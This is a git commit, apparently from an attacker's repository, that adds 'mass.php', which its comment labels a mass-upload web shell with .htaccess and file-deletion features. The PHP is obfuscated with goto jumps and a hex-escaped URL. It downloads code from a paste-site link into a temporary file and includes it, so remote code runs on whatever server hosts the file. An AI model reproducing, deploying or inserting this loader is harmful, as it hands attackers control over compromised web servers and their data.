fa89ef7d50a9648ff8c0962366163cd3d4f70f44
kitabisacom1337 <dxy1927@gmail.com>
2024-10-11 11:30:52 +0700

    mass.php

---
+++ mass.php
@@ -0,0 +1,4 @@
+<?php
+#* Kitabisacom1337
+#* Mass Upload Shell With .htaccess + Delete File
+goto sHNkh; sHNkh: $EnoeA = tmpfile(); goto uTcE6; uTcE6: $UmXGi = fwrite($EnoeA, file_get_contents("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x61\x73\x74\x65\x2e\x65\x65\x2f\x72\x2f\x53\x30\x58\x50\x6a\x2f\x30")); goto xa01q; xa01q: include stream_get_meta_data($EnoeA)["\165\x72\x69"]; goto Lg1o1; Lg1o1: fclose($EnoeA);
